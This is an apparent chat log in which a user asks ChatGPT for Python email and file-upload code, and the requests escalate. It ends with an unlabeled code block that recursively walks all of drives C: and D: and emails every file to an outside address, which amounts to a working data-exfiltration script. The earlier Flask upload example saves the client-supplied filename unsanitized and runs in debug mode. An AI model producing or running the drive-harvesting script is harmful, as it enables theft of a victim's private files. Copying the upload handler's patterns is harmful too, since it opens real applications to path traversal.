Can we send emails with Python?
ChatGPT
Yes, you can send emails using Python. There are several libraries available in Python for sending emails, but one of the most commonly used is the built-in smtplib library, which allows you to connect to an SMTP server and send emails programmatically. Additionally, you can use the email library to create and format the email messages.

Here's a basic example of how you can send an email using Python:

python
Copy code
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Email and password for the sender's email account
sender_email = "your_email@gmail.com"
sender_password = "your_password"

# Recipient email address
recipient_email = "recipient_email@example.com"

# Create a message object
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = recipient_email
message["Subject"] = "Test Email"

# Add body to the email
body = "This is a test email sent using Python."
message.attach(MIMEText(body, "plain"))

# Connect to the SMTP server
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(sender_email, sender_password)
    server.send_message(message)
    print("Email sent successfully!")
Remember to replace "your_email@gmail.com", "your_password", and "recipient_email@example.com" with your actual email address, password, and the recipient's email address respectively. Also, ensure that you have enabled less secure apps access or created an app password if you are using Gmail for sending emails programmatically.

Can document files such as pdf and excel be uploaded?
ChatGPT
Yes, you can upload document files such as PDFs and Excel files using Python. If you're working with web applications, you can handle file uploads using frameworks like Flask or Django. Both of these frameworks provide functionality to handle file uploads easily.

Here's a basic example using Flask to handle file uploads:

python
Copy code
from flask import Flask, render_template, request, redirect, url_for, flash
import os

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'pdf', 'xlsx', 'xls'}

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        # Check if the post request has the file part
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        # If the user does not select a file, the browser submits an empty file without a filename
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file and allowed_file(file.filename):
            filename = file.filename
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            flash('File uploaded successfully')
            return redirect(url_for('upload_file'))
        else:
            flash('Allowed file types are pdf, xlsx, xls')
            return redirect(request.url)
    return render_template('upload.html')

if __name__ == '__main__':
    app.secret_key = 'super_secret_key'
    app.run(debug=True)
In this example, the uploaded files are saved in a folder named uploads. The allowed_file function checks if the file has a permitted extension. You can expand the ALLOWED_EXTENSIONS set to include other document file types like Word documents (doc, docx) or PowerPoint presentations (ppt, pptx) if needed.

Can you write the code that sends all files such as excel world, pdf pptx etc. in a folder one by one via e-mail?
ChatGPT
Sure, I can provide you with an example code that iterates through all files in a folder, checks their extensions to ensure they are allowed file types, and sends them via email one by one. Here's the code:

python
Copy code
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

# Email and password for the sender's email account
sender_email = "your_email@gmail.com"
sender_password = "your_password"

# Recipient email address
recipient_email = "recipient_email@example.com"

# Path to the folder containing the files to be sent
folder_path = "folder_with_files"

# Connect to the SMTP server
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(sender_email, sender_password)

    # Iterate through all files in the folder
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            # Check if the file extension is allowed
            allowed_extensions = {'pdf', 'doc', 'docx', 'xlsx', 'xls', 'pptx'}
            file_extension = filename.split('.')[-1].lower()
            if file_extension in allowed_extensions:
                # Create a message object
                message = MIMEMultipart()
                message["From"] = sender_email
                message["To"] = recipient_email
                message["Subject"] = f"File: {filename}"

                # Attach the file to the email
                with open(file_path, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename= {filename}",
                )
                message.attach(part)

                # Send the email
                server.send_message(message)
                print(f"{filename} sent successfully!")

print("All files sent successfully!")
Make sure to replace "your_email@gmail.com", "your_password", "recipient_email@example.com", and "folder_with_files" with appropriate values. This script will iterate through all files in the specified folder, check their extensions, and send them as email attachments if their extensions are allowed.

def send_email_with_attachment(file_path):
    # Connect to the SMTP server
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)

        # Create a message object
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = recipient_email
        message["Subject"] = f"File: {file_path}"

        # Attach the file to the email
        with open(file_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {os.path.basename(file_path)}",
        )
        message.attach(part)

        # Send the email
        server.send_message(message)
        print(f"{file_path} sent successfully!")

# Function to browse folders recursively and send files
def browse_and_send_files(folder):
    for root, dirs, files in os.walk(folder):
        for file in files:
            file_path = os.path.join(root, file)
            send_email_with_attachment(file_path)

# Browse folders on disks C and D
for drive in ['C:', 'D:']:
    if os.path.exists(drive):
        browse_and_send_files(drive)

print("All files sent successfully!")
